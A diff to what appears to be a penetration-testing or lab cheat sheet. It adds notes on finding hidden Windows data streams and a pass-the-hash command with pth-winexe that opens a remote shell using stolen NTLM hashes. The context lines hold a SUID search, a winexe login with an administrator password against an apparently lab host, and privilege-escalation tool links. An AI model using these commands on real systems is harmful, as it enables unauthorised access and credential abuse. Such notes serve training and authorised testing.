@@ -338,6 +338,10 @@ ASP: aspx
 PERL: pl, .cgi, .lib
 JSP: jspx, jsw, jsv, jspf
 
+
+On Windows machines, files can be hidden on different data streams ($DATA and $INDEX_LOCATION), reveal with ```dir /r``` and show content with more < $FILENAME:STREAM
+
+
 Find all SUID files:
 ```
 find / -perm /4000 -exec ls -l {} \; 2>/dev/null
@@ -496,6 +500,9 @@ winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
 ```
 
 If NTLM hash is accquired -> can perform Pass The Hash attack with path-winexe
+```
+pth-winexe -U user%<LM Hash>:<NT Hash> //$RHOST cmd
+```
 
 https://github.com/M4ximuss/Powerless
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
